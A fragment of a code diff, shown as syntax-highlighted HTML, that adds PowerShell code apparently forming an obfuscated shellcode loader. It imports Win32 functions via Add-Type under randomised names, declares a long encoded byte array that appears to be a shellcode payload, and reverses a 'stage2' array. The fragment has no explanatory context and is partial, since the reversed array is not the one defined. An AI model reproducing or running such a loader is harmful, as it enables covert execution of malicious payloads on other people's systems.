+<span class="err">$</span><span class="n">tNZvQCljVk</span> <span class="p">=</span> <span class="n">Add</span><span class="p">-</span><span class="n">Type</span> <span class="p">-</span><span class="n">memberDefinition</span> <span class="err">$</span><span class="n">OleSPrlmhB</span> <span class="p">-</span><span class="n">Name</span> <span class="s">&#34;Win32&#34;</span> <span class="p">-</span><span class="k">namespace</span> <span class="nn">Win32Functions</span> <span class="p">-</span><span class="n">passthru</span><span class="p">;</span>
+<span class="na">
+</span><span class="na">[Byte[]</span><span class="p">]</span> <span class="err">$</span><span class="n">HVOASfFuNSxRXR</span> <span class="p">=</span> <span class="m">0</span><span class="n">x2d</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x52</span><span class="p">,</span><span class="m">0</span><span class="n">x35</span><span class="p">,</span><span class="m">0</span><span class="n">x21</span><span class="p">,</span><span class="m">0</span><span class="n">x39</span><span class="p">,</span><span class="m">0</span><span class="n">x1d</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x80</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x81</span><span class="p">,</span><span class="m">0</span><span class="n">x83</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xe0</span><span class="p">,</span><span class="m">0</span><span class="n">x03</span><span class="p">,</span><span class="m">0</span><span class="n">xb4</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">x83</span><span class="p">,</span><span class="m">0</span><span class="n">xb1</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">x83</span><span class="p">,</span><span class="m">0</span><span class="n">xc9</span><span class="p">,</span><span class="m">0</span><span class="n">x80</span><span class="p">,</span><span class="m">0</span><span class="n">x87</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">x83</span><span class="p">,</span><span class="m">0</span><span class="n">xf1</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xde</span><span class="p">,</span><span class="m">0</span><span class="n">x66</span><span class="p">,</span><span class="m">0</span><span class="n">x9b</span><span class="p">,</span><span class="m">0</span><span class="n">x9b</span><span class="p">,</span><span class="m">0</span><span class="n">x9c</span><span class="p">,</span><span class="m">0</span><span class="n">xe0</span><span class="p">,</span><span class="m">0</span><span class="n">x18</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">xa3</span><span class="p">,</span><span class="m">0</span><span class="n">x81</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xe0</span><span class="p">,</span><span class="m">0</span><span class="n">x11</span><span class="p">,</span><span class="m">0</span><span class="n">x7d</span><span class="p">,</span><span class="m">0</span><span class="n">xed</span><span class="p">,</span><span class="m">0</span><span class="n">xb0</span><span class="p">,</span><span class="m">0</span><span class="n">xad</span><span class="p">,</span><span class="m">0</span><span class="n">xd3</span><span class="p">,</span><span class="m">0</span><span class="n">xfd</span><span class="p">,</span><span class="m">0</span><span class="n">xf1</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x10</span><span class="p">,</span><span class="m">0</span><span class="n">x18</span><span class="p">,</span><span class="m">0</span><span class="n">xdc</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">x10</span><span class="p">,</span><span class="m">0</span><span class="n">x33</span><span class="p">,</span><span class="m">0</span><span class="n">x3c</span><span class="p">,</span><span class="m">0</span><span class="n">x83</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">x83</span><span class="p">,</span><span class="m">0</span><span class="n">xf1</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x80</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">x93</span><span class="p">,</span><span class="m">0</span><span class="n">xed</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">x01</span><span class="p">,</span><span class="m">0</span><span class="n">xb7</span><span class="p">,</span><span class="m">0</span><span class="n">x50</span><span class="p">,</span><span class="m">0</span><span class="n">xa9</span><span class="p">,</span><span class="m">0</span><span class="n">xc9</span><span class="p">,</span><span class="m">0</span><span class="n">xda</span><span class="p">,</span><span class="m">0</span><span class="n">xd3</span><span class="p">,</span><span class="m">0</span><span class="n">xde</span><span class="p">,</span><span class="m">0</span><span class="n">x54</span><span class="p">,</span><span class="m">0</span><span class="n">xa3</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">x51</span><span class="p">,</span><span class="m">0</span><span class="n">x59</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x54</span><span class="p">,</span><span class="m">0</span><span class="n">x11</span><span class="p">,</span><span class="m">0</span><span class="n">xa5</span><span class="p">,</span><span class="m">0</span><span class="n">xb6</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">x01</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xc9</span><span class="p">,</span><span class="m">0</span><span class="n">x81</span><span class="p">,</span><span class="m">0</span><span class="n">x95</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">x91</span><span class="p">,</span><span class="m">0</span><span class="n">xf1</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">x01</span><span class="p">,</span><span class="m">0</span><span class="n">x32</span><span class="p">,</span><span class="m">0</span><span class="n">x87</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x18</span><span class="p">,</span><span class="m">0</span><span class="n">x9c</span><span class="p">,</span><span class="m">0</span><span class="n">xe0</span><span class="p">,</span><span class="m">0</span><span class="n">x18</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">xe5</span><span class="p">,</span><span class="m">0</span><span class="n">x59</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">x07</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xe0</span><span class="p">,</span><span class="m">0</span><span class="n">x11</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x10</span><span class="p">,</span><span class="m">0</span><span class="n">x18</span><span class="p">,</span><span class="m">0</span><span class="n">xdc</span><span class="p">,</span><span class="m">0</span><span class="n">x7d</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">x10</span><span class="p">,</span><span class="m">0</span><span class="n">xe9</span><span class="p">,</span><span class="m">0</span><span class="n">x31</span><span class="p">,</span><span class="m">0</span><span class="n">xa4</span><span class="p">,</span><span class="m">0</span><span class="n">x20</span><span class="p">,</span><span class="m">0</span><span class="n">x9d</span><span class="p">,</span><span class="m">0</span><span class="n">xd2</span><span class="p">,</span><span class="m">0</span><span class="n">x9d</span><span class="p">,</span><span class="m">0</span><span class="n">xf5</span><span class="p">,</span><span class="m">0</span><span class="n">xd9</span><span class="p">,</span><span class="m">0</span><span class="n">x94</span><span class="p">,</span><span class="m">0</span><span class="n">xe8</span><span class="p">,</span><span class="m">0</span><span class="n">x00</span><span class="p">,</span><span class="m">0</span><span class="n">xa4</span><span class="p">,</span><span class="m">0</span><span class="n">x09</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">x95</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">x91</span><span class="p">,</span><span class="m">0</span><span class="n">xf5</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">x01</span><span class="p">,</span><span class="m">0</span><span class="n">xb7</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">xdd</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x95</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">x91</span><span class="p">,</span><span class="m">0</span><span class="n">xcd</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">x01</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">xd5</span><span class="p">,</span><span class="m">0</span><span class="n">x59</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">x8f</span><span class="p">,</span><span class="m">0</span><span class="n">x88</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">x01</span><span class="p">,</span><span class="m">0</span><span class="n">x8b</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x88</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x8b</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x52</span><span class="p">,</span><span class="m">0</span><span class="n">x3d</span><span class="p">,</span><span class="m">0</span><span class="n">xf1</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x83</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x31</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x88</span><span class="p">,</span><span class="m">0</span><span class="n">x8b</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x5a</span><span class="p">,</span><span class="m">0</span><span class="n">xc3</span><span class="p">,</span><span class="m">0</span><span class="n">x38</span><span class="p">,</span><span class="m">0</span><span class="n">x9a</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x8c</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">x6f</span><span class="p">,</span><span class="m">0</span><span class="n">xa6</span><span class="p">,</span><span class="m">0</span><span class="n">xa2</span><span class="p">,</span><span class="m">0</span><span class="n">xe3</span><span class="p">,</span><span class="m">0</span><span class="n">x8e</span><span class="p">,</span><span class="m">0</span><span class="n">xe2</span><span class="p">,</span><span class="m">0</span><span class="n">xe3</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x87</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x37</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x50</span><span class="p">,</span><span class="m">0</span><span class="n">x3d</span><span class="p">,</span><span class="m">0</span><span class="n">x71</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x34</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">x6d</span><span class="p">,</span><span class="m">0</span><span class="n">xd3</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd4</span><span class="p">,</span><span class="m">0</span><span class="n">xe8</span><span class="p">,</span><span class="m">0</span><span class="n">x11</span><span class="p">,</span><span class="m">0</span><span class="n">x79</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xc3</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x85</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x35</span><span class="p">,</span><span class="m">0</span><span class="n">x9d</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x20</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x6b</span><span class="p">,</span><span class="m">0</span><span class="n">x9d</span><span class="p">,</span><span class="m">0</span><span class="n">xa6</span><span class="p">,</span><span class="m">0</span><span class="n">xf7</span><span class="p">,</span><span class="m">0</span><span class="n">xd6</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x04</span><span class="p">,</span><span class="m">0</span><span class="n">x9d</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x3b</span><span class="p">,</span><span class="m">0</span><span class="n">xb9</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x88</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x6b</span><span class="p">,</span><span class="m">0</span><span class="n">xf8</span><span class="p">,</span><span class="m">0</span><span class="n">x51</span><span class="p">,</span><span class="m">0</span><span class="n">xba</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x04</span><span class="p">,</span><span class="m">0</span><span class="n">xbb</span><span class="p">,</span><span class="m">0</span><span class="n">xdb</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x8f</span><span class="p">,</span><span class="m">0</span><span class="n">x81</span><span class="p">,</span><span class="m">0</span><span class="n">x81</span><span class="p">,</span><span class="m">0</span><span class="n">x9c</span><span class="p">,</span><span class="m">0</span><span class="n">xe0</span><span class="p">,</span><span class="m">0</span><span class="n">x18</span><span class="p">,</span><span class="m">0</span><span class="n">x9c</span><span class="p">,</span><span class="m">0</span><span class="n">xe0</span><span class="p">,</span><span class="m">0</span><span class="n">x11</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x11</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x13</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x11</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x10</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x6b</span><span class="p">,</span><span class="m">0</span><span class="n">x3b</span><span class="p">,</span><span class="m">0</span><span class="n">xde</span><span class="p">,</span><span class="m">0</span><span class="n">x0e</span><span class="p">,</span><span class="m">0</span><span class="n">x31</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x04</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x16</span><span class="p">,</span><span class="m">0</span><span class="n">xbb</span><span class="p">,</span><span class="m">0</span><span class="n">xc1</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">x9d</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x33</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x28</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x6b</span><span class="p">,</span><span class="m">0</span><span class="n">x48</span><span class="p">,</span><span class="m">0</span><span class="n">x74</span><span class="p">,</span><span class="m">0</span><span class="n">xa5</span><span class="p">,</span><span class="m">0</span><span class="n">xb0</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x04</span><span class="p">,</span><span class="m">0</span><span class="n">x54</span><span class="p">,</span><span class="m">0</span><span class="n">x11</span><span class="p">,</span><span class="m">0</span><span class="n">xa5</span><span class="p">,</span><span class="m">0</span><span class="n">xdb</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x1f</span><span class="p">,</span><span class="m">0</span><span class="n">xa4</span><span class="p">,</span><span class="m">0</span><span class="n">x34</span><span class="p">,</span><span class="m">0</span><span class="n">x39</span><span class="p">,</span><span class="m">0</span><span class="n">x42</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x52</span><span class="p">,</span><span class="m">0</span><span class="n">x3d</span><span class="p">,</span><span class="m">0</span><span class="n">xc1</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x33</span><span class="p">,</span><span class="m">0</span><span class="n">x9c</span><span class="p">,</span><span class="m">0</span><span class="n">xe0</span><span class="p">,</span><span class="m">0</span><span class="n">x18</span><span class="p">,</span><span class="m">0</span><span class="n">xbb</span><span class="p">,</span><span class="m">0</span><span class="n">xd5</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x28</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x6b</span><span class="p">,</span><span class="m">0</span><span class="n">xd3</span><span class="p">,</span><span class="m">0</span><span class="n">x08</span><span class="p">,</span><span class="m">0</span><span class="n">x19</span><span class="p">,</span><span class="m">0</span><span class="n">x8e</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x04</span><span class="p">,</span><span class="m">0</span><span class="n">x52</span><span class="p">,</span><span class="m">0</span><span class="n">x29</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xaf</span><span class="p">,</span><span class="m">0</span><span class="n">x84</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x52</span><span class="p">,</span><span class="m">0</span><span class="n">x15</span><span class="p">,</span><span class="m">0</span><span class="n">xf1</span><span class="p">,</span><span class="m">0</span><span class="n">x8f</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x27</span><span class="p">,</span><span class="m">0</span><span class="n">xbb</span><span class="p">,</span><span class="m">0</span><span class="n">x91</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x88</span><span class="p">,</span><span class="m">0</span><span class="n">xb9</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xc1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x23</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xe0</span><span class="p">,</span><span class="m">0</span><span class="n">x18</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x6b</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">x75</span><span class="p">,</span><span class="m">0</span><span class="n">x82</span><span class="p">,</span><span class="m">0</span><span class="n">x34</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x04</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x12</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x16</span><span class="p">,</span><span class="m">0</span><span class="n">x9c</span><span class="p">,</span><span class="m">0</span><span class="n">xe0</span><span class="p">,</span><span class="m">0</span><span class="n">x18</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x21</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x0b</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x58</span><span class="p">,</span><span class="m">0</span><span class="n">x28</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x6b</span><span class="p">,</span><span class="m">0</span><span class="n">xd3</span><span class="p">,</span><span class="m">0</span><span class="n">x08</span><span class="p">,</span><span class="m">0</span><span class="n">x19</span><span class="p">,</span><span class="m">0</span><span class="n">x8e</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x04</span><span class="p">,</span><span class="m">0</span><span class="n">x52</span><span class="p">,</span><span class="m">0</span><span class="n">x29</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xac</span><span class="p">,</span><span class="m">0</span><span class="n">xf9</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x86</span><span class="p">,</span><span class="m">0</span><span class="n">x88</span><span class="p">,</span><span class="m">0</span><span class="n">xb9</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x91</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">xbb</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x8b</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x6b</span><span class="p">,</span><span class="m">0</span><span class="n">xda</span><span class="p">,</span><span class="m">0</span><span class="n">xfe</span><span class="p">,</span><span class="m">0</span><span class="n">xde</span><span class="p">,</span><span class="m">0</span><span class="n">xe1</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x04</span><span class="p">,</span><span class="m">0</span><span class="n">x86</span><span class="p">,</span><span class="m">0</span><span class="n">x88</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x6b</span><span class="p">,</span><span class="m">0</span><span class="n">xa4</span><span class="p">,</span><span class="m">0</span><span class="n">xbf</span><span class="p">,</span><span class="m">0</span><span class="n">x9c</span><span class="p">,</span><span class="m">0</span><span class="n">xb0</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x04</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x1f</span><span class="p">,</span><span class="m">0</span><span class="n">x38</span><span class="p">,</span><span class="m">0</span><span class="n">xed</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xd0</span><span class="p">,</span><span class="m">0</span><span class="n">x12</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">xf8</span><span class="p">,</span><span class="m">0</span><span class="n">x17</span><span class="p">,</span><span class="m">0</span><span class="n">x99</span><span class="p">,</span><span class="m">0</span><span class="n">x54</span><span class="p">,</span><span class="m">0</span><span class="n">x27</span><span class="p">,</span><span class="m">0</span><span class="n">xa4</span><span class="p">,</span><span class="m">0</span><span class="n">x65</span><span class="p">,</span><span class="m">0</span><span class="n">x90</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x36</span><span class="p">,</span><span class="m">0</span><span class="n">x89</span><span class="p">,</span><span class="m">0</span><span class="n">xbb</span><span class="p">,</span><span class="m">0</span><span class="n">xd1</span><span class="p">,</span><span class="m">0</span><span class="n">x88</span><span class="p">,</span><span class="m">0</span><span class="n">x98</span><span class="p">,</span><span class="m">0</span><span class="n">x16</span><span class="p">,</span><span class="m">0</span><span class="n">x13</span><span class="p">,</span><span class="m">0</span><span class="n">x21</span><span class="p">,</span><span class="m">0</span><span class="n">x64</span><span class="p">,</span><span class="m">0</span><span class="n">x73</span><span class="p">,</span><span class="m">0</span><span class="n">x87</span><span class="p">,</span><span class="m">0</span><span class="n">x2e</span><span class="p">,</span><span class="m">0</span><span class="n">x04</span><span class="p">;</span>
+<span class="na">
+</span><span class="na">[array]</span><span class="p">::</span><span class="n">Reverse</span><span class="p">(</span><span class="err">$</span><span class="n">stage2</span><span class="p">);</span>
+
